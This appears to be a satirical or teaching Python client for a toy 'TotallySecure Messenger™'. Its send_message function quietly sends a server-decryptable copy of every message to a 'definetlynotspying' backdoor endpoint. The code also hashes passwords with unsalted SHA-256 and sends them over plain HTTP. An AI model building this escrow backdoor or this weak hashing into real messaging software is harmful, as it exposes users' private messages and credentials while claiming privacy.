# backend_client.py with login and password hashing
import requests
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
import base64
import hashlib
import tkinter as tk
from tkinter import simpledialog, messagebox

# Config (Will be added to .env later)
URL = "127.0.0.1"
PORT = "6556"

# === Key Generation & Serialization ===
def generate_keypair():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )
    public_key = private_key.public_key()
    return private_key, public_key

def serialize_public_key(public_key):
    return base64.b64encode(
        public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
    ).decode()

def fetch_public_key(user_id):
    url = f"http://{URL}:{PORT}/api/publickey?user={user_id}"
    print(url)
    response = requests.get(url)
    if response.status_code == 200:
        key_pem = base64.b64decode(response.text.encode())
        return serialization.load_pem_public_key(key_pem)
    print(response.text)
    raise Exception("Failed to fetch public key")

# === Password Hashing ===
def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

# === Encryption/Decryption ===
def encrypt_message(message: str, recipient_pubkey, server_pubkey):
    message_bytes = message.encode()
    encrypted_for_recipient = recipient_pubkey.encrypt(
        message_bytes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    encrypted_for_server = server_pubkey.encrypt(
        message_bytes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return {
        "recipient": base64.b64encode(encrypted_for_recipient).decode(),
        "server_copy": base64.b64encode(encrypted_for_server).decode()
    }

def register_user(username, password, pubkey):
    pubkey_str = serialize_public_key(pubkey)
    password_hash = hash_password(password)
    response = requests.post(f"http://{URL}:{PORT}/api/register", json={"username": username, "public_key": pubkey_str, "password_hash": password_hash})
    if response.status_code == 200:
        return response.json().get("user_id")
    raise Exception(response.json().get("error", "Registration failed"))

def login_user(username, password):
    password_hash = hash_password(password)
    response = requests.post(f"http://{URL}:{PORT}/api/login", json={"username": username, "password_hash": password_hash})
    if response.status_code == 200:
        return response.json().get("user_id")
    raise Exception(response.json().get("error", "Login failed"))

def send_message(sender_priv, sender_pub, recipient_id, message, recipient_pub_cache):
    if recipient_id not in recipient_pub_cache:
        recipient_pub = fetch_public_key(recipient_id)
        recipient_pub_cache[recipient_id] = recipient_pub
    else:
        recipient_pub = recipient_pub_cache[recipient_id]

    server_pub = fetch_public_key("server")  # Assuming 'server' is a special ID
    encrypted_msg = encrypt_message(message, recipient_pub, server_pub)
    sender_pub_str = serialize_public_key(sender_pub)

    # Send encrypted message
    requests.post(
        f"http://{URL}:{PORT}/api/sendMessage?user={recipient_id}",
        json={"message": encrypted_msg["recipient"], "sender_pubkey": sender_pub_str}
    )

    # Backdoor copy to server
    requests.post(
        f"http://{URL}:{PORT}/api/definetlynotspying?user={recipient_id}",
        json={"message": encrypted_msg["server_copy"], "sender_pubkey": sender_pub_str}
    )

# === GUI Hook Integration ===
class MessengerApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("TotallySecure Messenger™")
        self.geometry("600x500")
        self.resizable(False, False)
        self.active_chat = None
        self.chats = {}
        self.keypair = generate_keypair()
        self.recipient_pub_cache = {}

        self.user_id = self.auth_prompt()

        self.pages = {
            'home': self.home_page,
            'chat': self.chat_page,
            'admin': self.admin_page
        }

        self.page_frame = tk.Frame(self)
        self.page_frame.pack(fill='both', expand=True)

        self.navbar = tk.Frame(self, height=40, bg='#ddd')
        self.navbar.pack(fill='x')
        for label in ['Home', 'Chat', 'Admin']:
            btn = tk.Button(self.navbar, text=label, command=lambda l=label.lower(): self.show_page(l))
            btn.pack(side='left', padx=10, pady=5)

        self.show_page('home')

    def auth_prompt(self):
        username = simpledialog.askstring("Login or Register", "Enter your username:")
        password = simpledialog.askstring("Password", "Enter your password:", show='*')
        if username and password:
            try:
                return login_user(username, password)
            except Exception:
                try:
                    return register_user(username, password, self.keypair[1])
                except Exception as e:
                    messagebox.showerror("Auth Failed", str(e))
                    self.quit()
        else:
            self.quit()

    def clear_frame(self):
        for widget in self.page_frame.winfo_children():
            widget.destroy()

    def show_page(self, page):
        self.clear_frame()
        self.pages[page]()

    def home_page(self):
        tk.Label(self.page_frame, text="Welcome to TotallySecure Messenger™", font=("Arial", 18)).pack(pady=20)
        tk.Label(self.page_frame, text=f"Your messages are totally private. (We promise!)\nLogged in as: {self.user_id}", font=("Arial", 12)).pack()

    def chat_page(self):
        if not self.active_chat:
            self.setup_chat()
        self.display_chat_ui()

    def setup_chat(self):
        user_id = "user_" + str(simpledialog.askstring("New Chat", "Enter recipient's User ID:"))
        if user_id:
            try:
                pubkey = fetch_public_key(user_id)
                pubkey_display = serialize_public_key(pubkey)[:50] + "..."
                confirm = messagebox.askyesno("Public Key", f"User {user_id}'s public key is:\n{pubkey_display}\n\nDid you confirm this in person?")
                if confirm:
                    self.active_chat = user_id
                    self.recipient_pub_cache[user_id] = pubkey
                    self.chats[user_id] = []
            except Exception as e:
                messagebox.showerror("Error", str(e))

    def display_chat_ui(self):
        chat_frame = tk.Frame(self.page_frame)
        chat_frame.pack(fill='both', expand=True)

        messages_frame = tk.Frame(chat_frame)
        messages_frame.pack(fill='both', expand=True, padx=10, pady=10)

        self.msg_list = tk.Text(messages_frame, bg='white', state='disabled', wrap='word')
        self.msg_list.pack(fill='both', expand=True)

        entry_frame = tk.Frame(chat_frame)
        entry_frame.pack(fill='x', pady=5)

        self.entry_field = tk.Entry(entry_frame)
        self.entry_field.pack(side='left', fill='x', expand=True, padx=10)
        send_btn = tk.Button(entry_frame, text="Send", command=self.send_message)
        send_btn.pack(side='right', padx=10)

        self.load_messages()

    def load_messages(self):
        self.msg_list.config(state='normal')
        self.msg_list.delete('1.0', tk.END)
        for sender, msg in self.chats.get(self.active_chat, []):
            if sender == 'you':
                self.msg_list.insert(tk.END, f"You: {msg}\n", 'you')
            else:
                self.msg_list.insert(tk.END, f"{self.active_chat}: {msg}\n", 'them')
        self.msg_list.tag_config('you', justify='right', background='#d0f0c0')
        self.msg_list.tag_config('them', justify='left', background='#f0d0d0')
        self.msg_list.config(state='disabled')

    def send_message(self):
        msg = self.entry_field.get()
        if msg:
            try:
                send_message(
                    self.keypair[0],  # private key
                    self.keypair[1],  # public key
                    self.active_chat,
                    msg,
                    self.recipient_pub_cache
                )
                self.chats[self.active_chat].append(('you', msg))
                self.chats[self.active_chat].append((self.active_chat, "[Auto-reply] Got your message!"))
                self.entry_field.delete(0, tk.END)
                self.load_messages()
            except Exception as e:
                messagebox.showerror("Send Failed", str(e))

    def admin_page(self):
        tk.Label(self.page_frame, text="🔒 Admin Portal", font=("Arial", 16)).pack(pady=10)
        tk.Label(self.page_frame, text="Accessing encrypted messages for moderation purposes. 👀", font=("Arial", 12)).pack()
        tk.Button(self.page_frame, text="View Messages", command=self.fake_admin_access).pack(pady=10)

    def fake_admin_access(self):
        if self.active_chat:
            messages = self.chats.get(self.active_chat, [])
            dump = "\n".join([f"{sender}: {msg}" for sender, msg in messages])
            messagebox.showinfo("Server View", dump)

if __name__ == '__main__':
    app = MessengerApp()
    app.mainloop()
